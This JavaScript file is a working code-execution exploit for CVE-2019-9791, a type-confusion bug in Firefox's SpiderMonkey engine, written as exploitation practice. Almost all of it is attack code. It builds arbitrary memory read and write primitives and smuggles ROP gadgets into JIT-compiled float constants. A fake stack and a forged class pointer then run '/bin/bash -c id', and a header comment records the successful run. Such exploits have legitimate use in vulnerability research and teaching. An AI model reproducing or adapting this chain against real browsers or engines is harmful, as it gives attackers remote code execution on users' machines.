/*
Code Execution PoC of CVE-2019-9791 for practice of exploiting SpiderMonkey.
    - Bug Finder: @saelo
    - Target: 67fc2c30797036217de91cdb4b6d77a876bed7db^
    - Reference: https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/

    % build-release/bin/js67 --version
    JavaScript-C67.0a1
    % build-release/bin/js67 work/exploit-js67.js 
    [+] Successfully got the primitives!
    [+] Successfully got more stable primitives!
    [*] jitMe's entry point @ 0x5972f1318e0
    [*] Searching the JIT region for the marker...
    [+] The marker found @ 0x5972f131a3e
    [*] Preparing a fake stack...
    [*] fakeStack's backing store @ 0x7f3600b83000
    [*] fakeCOps's backing store @ 0x232a41f0d3e0
    [*] fakeClasp's backing store @ 0x232a41f15ee8
    [*] trigger @ 0x232a41f1c938
    [*] trigger.as<NativeObject>->group_ @ 0x3dc8946dda30
    [*] trigger.as<NativeObject>->group_->clasp_ @ 0x5632b3cac4c0
    [*] Executing `/bin/bash -c id`...
    uid=1000(user) gid=1000(user) groups=1000(user)
    %
*/

function print(message) {
  console.log(message);
}

function info(message) {
  print(`[*] ${message}`);
}

function success(message) {
  print(`[+] ${message}`);
}

function fail(message) {
  print(`[-] ${message}`);
}

function warn(message) {
  print(`[!] ${message}`);
}

let debugging = true;
function debug(message) {
  if (debugging) {
    print(`[DEBUG] ${message}`);
  }
}

function busywait() {
  while (1);
}

function quit(message) {
  throw new Error(message);
}

function breakpoint(arg) {
  Math.atan2(arg);
}

function gc() {
  const maxMallocBytes = 128 * 1024 * 1024;
  for (let i = 0; i < 3; i++) {
    let x = new ArrayBuffer(maxMallocBytes);
  }
}

function hex(v) {
  return v.toString(16);
}

function hex1(v) {
  return hex(v).padStart(2, '0');
}

function hex2(v) {
  return hex(v).padStart(4, '0');
}

function hex4(v) {
  return hex(v).padStart(8, '0');
}

function hex8(v) {
  return hex(v).padStart(16, '0');
}

function hexlify(bytes) {
  if (bytes instanceof Uint8Array) {
    bytes = Array.from(bytes);
  }
  if (!bytes instanceof Array) {
    throw new Error('Fuck!');
  }
  return bytes.map(hex1).reverse().join('');
}

function unhexlify(hexstr) {
  if (hexstr.length > 16 || !hexstr.match(/^([0-9A-Fa-f]{2})+$/)) {
    throw new Error('Fuck!');
  }
  return Uint8Array.from(hexstr.match(/[0-9A-Fa-f]{2}/g).map(x => parseInt(x, 16)));
}

class Int64 {
  constructor(v) {
    this.bytes = new Uint8Array(8);
    this.uint32view = new Uint32Array(this.bytes.buffer);
    this.float64view = new Float64Array(this.bytes.buffer);

    switch (typeof v) {
      case 'number':
        if(!Number.isSafeInteger(v)) {
          throw new RangeError(`Cannot represent the number as 64-bit integer.`);
        }
        v = hex(v);
      case 'string':
        if (v.startsWith('0x')) {
          v = v.slice(2);
        }
        this.bytes.set(unhexlify(v.padStart(16, '0')).reverse());
      case 'undefined':
        break;
      case 'object':
        if (v instanceof Int64) {
          this.bytes.set(v.asBytes());
          break;
        }
        if(v instanceof Array || v instanceof Uint8Array) {
          if(v.length === 8) {
            this.bytes.set(v);
            break;
          }
        }
      default:
        throw new TypeError(`Cannot represent ${v} as 64-bit integer.`);
    }
  }

  asDouble() {
    if(!Number.isFinite(this.float64view[0])) {
      warn(`Cannot represent as double value. (${this})`);
    }
    return this.float64view[0];
  }

  asBytes() {
    return Uint8Array.from(this.bytes);
  }

  byteAt(i) {
    return this.bytes[i];
  }

  toString() {
    if(this.uint32view[1]) {
      return `0x${hex(this.uint32view[1])}${hex4(this.uint32view[0])}`;
    }
    return `0x${hex(this.uint32view[0])}`;
  }

  valueOf() {
    if(this.uint32view[1]) {
      warn(`The higher 32-bit is truncated. (${this})`);
    }
    return this.uint32view[0];
  }

  assignAnd(a, b) {
    a = new Int64(a);
    b = new Int64(b);
    for (let i = 0; i < this.bytes.length; i++) {
      this.bytes[i] = a.byteAt(i) & b.byteAt(i);
    }
    return this;
  }

  assignOr(a, b) {
    a = new Int64(a);
    b = new Int64(b);
    for (let i = 0; i < this.bytes.length; i++) {
      this.bytes[i] = a.byteAt(i) | b.byteAt(i);
    }
    return this;
  }

  assignXor(a, b) {
    a = new Int64(a);
    b = new Int64(b);
    for (let i = 0; i < this.bytes.length; i++) {
      this.bytes[i] = a.byteAt(i) ^ b.byteAt(i);
    }
    return this;
  }

  assignShiftLeft1(a) {
    a = new Int64(a);
    let carry = 0;
    for (let i = 0; i < this.bytes.length; i++) {
      let n = a.byteAt(i) << 1;
      this.bytes[i] = n | carry;
      carry = n > 0xff | 0;
    }
    return this;
  }

  assignShiftRight1(a) {
    a = new Int64(a);
    let borrow = 0;
    for (let i = this.bytes.length; i >= 0; i--) {
      let n = a.byteAt(i) >> 1;
      this.bytes[i] = (borrow << 7) | n;
      borrow = a.byteAt(i) & 1;
    }
    return this;
  }

  assignAdd(a, b) {
    a = new Int64(a);
    b = new Int64(b);
    let carry = 0;
    for (let i = 0; i < this.bytes.length; i++) {
      let x = a.byteAt(i) + b.byteAt(i) + carry;
      this.bytes[i] = x;
      carry = x > 0xff | 0;
    }
    return this;
  }

  assignSub(a, b) {
    a = new Int64(a);
    b = new Int64(b);
    let borrow = 0;
    for (let i = 0; i < this.bytes.length; i++) {
      let x = a.byteAt(i) - b.byteAt(i) - borrow;
      this.bytes[i] = x;
      borrow = x < 0 | 0;
    }
    return this;
  }

  equals(a) {
    a = new Int64(a);
    return this.bytes.every((x, i) => x === a.byteAt(i))
  }

  static and(a, b) {
    return new Int64().assignAnd(a, b);
  }

  static or(a, b) {
    return new Int64().assignOr(a, b);
  }

  static xor(a, b) {
    return new Int64().assignXor(a, b);
  }

  static shiftLeft1(a) {
    return new Int64().assignShiftLeft1(a);
  }

  static shiftRight1(a) {
    return new Int64().assignShiftRight1(a);
  }
  static add(a, b) {
    return new Int64().assignAdd(a, b);
  }

  static sub(a, b) {
    return new Int64().assignSub(a, b);
  }

  static fromDouble(d) {
    return new Int64(new Uint8Array(new Float64Array([d]).buffer));
  }
}

const PAGE_SIZE = 0x1000;
const PAGE_ALIGN_MASK = new Int64(`0xfffffffffffff000`);
const PAGE_OFFSET_MASK = new Int64(`0xfff`);
const JSVAL_SHIFTED_TAG_OBJECT = new Int64(`0xfffe000000000000`);

function pa(addr) {
  return Int64.and(addr, PAGE_ALIGN_MASK);
}

function po(addr) {
  return Int64.and(addr, PAGE_OFFSET_MASK)|0;
}

function v2a(val) {
  return Int64.xor(val, JSVAL_SHIFTED_TAG_OBJECT);
}

function a2v(addr) {
  return Int64.xor(addr, JSVAL_SHIFTED_TAG_OBJECT);
}

// CVE-2019-9791 PoC stolen from https://bugs.chromium.org/p/project-zero/issues/detail?id=1791.
class Primitive {
  constructor(sanityCheck=false) {
    const SIZE_HOLDING_INNER_STORE = 0x60

    let ab = new ArrayBuffer(SIZE_HOLDING_INNER_STORE);
    let victim = new Uint8Array(SIZE_HOLDING_INNER_STORE);

    function Hax(val, l, trigger) {
      // In the final invocation:

      // Ultimately confuse these two objects which each other.
      // x will (eventually) be an UnboxedObject, looking a bit like an ArrayBufferView object... :)
      let x = {
        slots: 13.37,
        elements: 13.38,
        buffer: ab,
        length: 13.39,
        byteOffset: 13.40,
        data: []
      };
      // y is a real ArrayBufferView object.
      let y = new Float64Array(SIZE_HOLDING_INNER_STORE);

      // * Trigger a conversion of |this| to a NativeObject.
      // * Update Hax's template type to NativeObject with .a and .x (and potentially .y)
      // * Trigger the "roll back" of |this| to a NativeObject with only property .a
      // * Bailout of the JITed code due to type inference changes
      this.a = val;

      // Trigger JIT compilation and OSR entry here. During compilation, IonMonkey will
      // incorrectly assume that |this| already has the final type (so already has property .x)
      for (let i = 0; i < l; i++) { }

      // The JITed code will now only have a property store here and won't update the Shape.
      this.x = x;

      if (trigger) {
        // This property definition is conditional (and rarely used) so that an inline cache
        // will be emitted for it, which will inspect the Shape of |this|. As such, .y will
        // be put into the same slot as .x, as the Shape of |this| only shows property .a.
        this.y = y;

        // At this point, .x and .y overlap, and the JITed code below believes that the slot
        // for .x still stores the UnboxedObject while in reality it now stores a Float64Array.
      }

      // This assignment will then corrupt the data pointer of the Float64Array to point to |victim|.
      this.x.data = victim;
    }

    for (let i = 0; i < 1000; i++) {
      new Hax(1337, 1, false);
    }
    let obj = new Hax("dummy", 10000000, true);

    this.victim = victim;
    this.driver = obj.y;
    this.ref = Int64.sub(Int64.fromDouble(this.driver[7]), 0x30);

    if(sanityCheck) {
      debug(`ref: ${this.ref}`);
      let testObj = { prop: 101 };
      debug(`testObj.prop: ${testObj.prop}`);
      let testAddr = this.addrOf(testObj);
      debug(`testObj @ 0x${testAddr}`);
      let fakedObj = this.fakeObj(testAddr);
      debug(`fakedObj @ 0x${this.addrOf(fakedObj)}`);
      testObj.prop = 0x31337;
      debug(`testObj.prop: 0x${hex(testObj.prop)}`);
      debug(`fakedObj.prop: 0x${hex(fakedObj.prop)}`);
      if(testObj.prop !== fakedObj.prop) {
        quit(`Primitive: sanity check failed.`);
      }
    }
  }

  read8(addr) {
    this.driver[7] = addr.asDouble();
    return new Int64(this.victim.slice(0, 8));
  }

  write8(addr, data) {
    this.driver[7] = addr.asDouble();
    this.victim.set(data.asBytes());
  }

  addrOf(obj) {
    this.victim.prop = obj;
    return v2a(this.read8(this.read8(this.ref)));
  }

  fakeObj(addr) {
    this.write8(this.read8(this.ref), a2v(addr));
    return this.victim.prop;
  }
}

class Memory {
  constructor(primitive, driver) {
    let driverAddr = primitive.addrOf(driver);
    let driverBufferAddr = primitive.addrOf(driver.buffer);
    debug(`Memory: driver @ ${driverAddr}`);
    debug(`Memory: driver.buffer @ ${driverBufferAddr}`);
    let cur = 0;
    for(let i = 0; i < 8; i++) {
      driver.set(primitive.read8(Int64.add(driverBufferAddr, i*8)).asBytes(), cur);
      cur += 8;
    }
    primitive.write8(Int64.add(driverAddr, 0x38), driverBufferAddr);
    this.driver = driver;
    this.ref = driverAddr;
    this.curPage = new Int64(this.driver.slice(0x20, 0x28));
  }

  setPageAddr(addr) {
    let pageAddr = pa(addr);
    if(!this.curPage.equals(pageAddr)) {
      this.driver.set(Int64.shiftRight1(pageAddr).asBytes(), 0x20);
      this.curPage = pageAddr;
      debug(`setPageAddr: Updated the page address to ${pageAddr}`);
    }
  }

  read1(addr) {
    this.setPageAddr(addr);
    return new Uint8Array(this.driver.buffer)[po(addr)];
  }

  write1(addr, byte) {
    this.setPageAddr(addr);
    new Uint8Array(this.driver.buffer).set([byte], po(addr));
  }

  read8(addr) {
    this.setPageAddr(addr);
    return new Int64(new Uint8Array(this.driver.buffer, po(addr), 8));
  }

  write8(addr, data) {
    this.setPageAddr(addr);
    new Uint8Array(this.driver.buffer, po(addr), 8).set(data.asBytes());
  }

  search8(startAddr, value, length) {
    for (let i = 0; i < length; i++) {
      let addr = Int64.add(startAddr, i);
      let data = this.read8(addr);
      debug(`${addr}: ${hexlify(data.asBytes())}`);
      if (data.equals(value)) {
        return addr;
      }
    }
    return null;
  }

  writeString(addr, str) {
    for(let i = 0; i < str.length; i++) {
        this.write1(Int64.add(addr, i), str.charCodeAt(i));
    }
    this.write1(Int64.add(addr, str.length), 0);
  }

  addrOf(obj) {
    this.driver.prop = obj;
    return v2a(this.read8(this.read8(Int64.add(this.ref, 0x10))));
  }
}


function pwn() {
  // 0. Create a memory viewer for AAR/AAW used later and move it to Tenuered region by invoking GC.
  let driver = new Uint8Array(0x1000);
  gc();

  // 1. Get **unstable** AAR/AAW/addrOf by abusing CVE-2019-9791.
  let primitive = new Primitive(sanityCheck=true);
  success(`Successfully got the primitives!`);

  // 2. Achieve stable AAR/AAW by using the primitives above.
  let memory = new Memory(primitive, driver);
  success(`Successfully got more stable primitives!`);

  // 3. Get a native code execution.
  // 3.1 Prepare a function which contains ROP gadgets in the middle of an intended instructions and make it JIT by executing continuously.
  const MARKER = new Int64('0x1337133713371337');
  function jitMe() {
    const marker = 4.183559446463817e-216;
    /*
        .quad 0x1337133713371337
     */

    const payload1 = 2.487827767156337e-275;
    /*
        mov     rsp, [rsp+0x20]
        nop
        jmp     $+8
    */

    const payload2 = -6.911007558471272e-229;
    /*
        mov     rbp, [rsp]
        leave
        ret
        nop
        nop
    */

    const payload3 = 2.5047758127751096e-275;
    /*
        pop     rdi
        pop     rsi
        xor     edx, edx
        xor     eax, eax
        jmp     $+8
    */

    const payload4 = 4.1938381e-316;
    /*
        add     al, 0x3b
        syscall
    */
  }
  for (let i = 0; i < 100; i++) {
    jitMe();
  }

  // 3.2 Walks the JIT region to find the marker.
  let jitMeEntryPointAddr = memory.read8(memory.read8(Int64.add(memory.addrOf(jitMe), 0x30)));
  info(`jitMe's entry point @ ${jitMeEntryPointAddr}`);

  info(`Searching the JIT region for the marker...`);
  let payloadEntryPoint = memory.search8(jitMeEntryPointAddr, MARKER, PAGE_SIZE);
  if (payloadEntryPoint === null) {
    quit(`Could not find the marker...`);
  }

  payloadEntryPoint = Int64.add(payloadEntryPoint, 0xe);
  success(`The marker found @ ${payloadEntryPoint}`);

  // 3.3 Create a fake stack and put ROP chains.
  info(`Preparing a fake stack...`);
  let fakeStack = new Uint8Array(PAGE_SIZE);
  fakeStackBackingStoreAddr = memory.read8(Int64.add(memory.addrOf(fakeStack), 0x38));
  info(`fakeStack's backing store @ ${fakeStackBackingStoreAddr}`);

  let argv = [
    "/bin/bash",
    "-c",
    "id",
  ];

  fakeStackContents = [
    Int64.add(payloadEntryPoint, 0xe*2),  // return address
    null,                                 // RDI
    null,                                 // RSI
    null,                                 // argv[0]
    null,                                 // argv[1]
    null,                                 // argv[2]
    new Int64(),                          // NULL
  ];
  let argvAddrOnFakeStack = Int64.add(fakeStackBackingStoreAddr, fakeStackContents.length*8);
  fakeStackContents[1] = argvAddrOnFakeStack;
  fakeStackContents[2] = Int64.add(fakeStackBackingStoreAddr, 3*8);
  
  let pos = 0;
  for(let i = 0; i < argv.length; i++) {
    let addr = Int64.add(argvAddrOnFakeStack, pos);
    memory.writeString(addr, argv[i]);
    fakeStackContents[i+3] = addr;
    pos += argv[i].length + 1; // including NUL byte.
  }

  for (let i = 0; i < fakeStackContents.length; i++) {
    memory.write8(Int64.add(fakeStackBackingStoreAddr, i*8), fakeStackContents[i]);
  }

  // 3.4 Create fake cops and clasp of Uint8Array.
  let fakeCOps = new Uint8Array(11 * 8);
  let fakeCOpsBackingStoreAddr = memory.read8(Int64.add(memory.addrOf(fakeCOps), 0x38));
  info(`fakeCOps's backing store @ ${fakeCOpsBackingStoreAddr}`);
  memory.write8(Int64.add(fakeCOpsBackingStoreAddr, 0x20), payloadEntryPoint);

  let fakeClasp = new Uint8Array(6 * 8);
  let fakeClaspBackingStoreAddr = memory.read8(Int64.add(memory.addrOf(fakeClasp), 0x38));
  info(`fakeClasp's backing store @ ${fakeClaspBackingStoreAddr}`);

  let trigger = new Uint8Array(1);
  let triggerAddr = memory.addrOf(trigger);
  info(`trigger @ ${triggerAddr}`);

  let triggerObjectGroupAddr = memory.read8(triggerAddr);
  info(`trigger.as<NativeObject>->group_ @ ${triggerObjectGroupAddr}`);

  let triggerClaspAddr = memory.read8(triggerObjectGroupAddr);
  info(`trigger.as<NativeObject>->group_->clasp_ @ ${triggerClaspAddr}`);

  for (let i = 0; i < fakeClasp.length; i += 0x8) {
    if (i == 0x10) {
      memory.write8(Int64.add(fakeClaspBackingStoreAddr, i), fakeCOpsBackingStoreAddr);
    } else {
      memory.write8(Int64.add(fakeClaspBackingStoreAddr, i), memory.read8(Int64.add(triggerClaspAddr, i)));
    }
  }

  // 4. Trigger the ROP sequence!
  memory.write8(triggerObjectGroupAddr, fakeClaspBackingStoreAddr);
  info(`Executing \`${argv.join(' ')}\`...`);
  trigger.bang = Int64.sub(fakeStackBackingStoreAddr, 0x8).asDouble();
}

function main() {
  debugging = false;
  try {
    pwn();
  } catch (e) {
    fail(e);
    busywait();
  }
}

main();
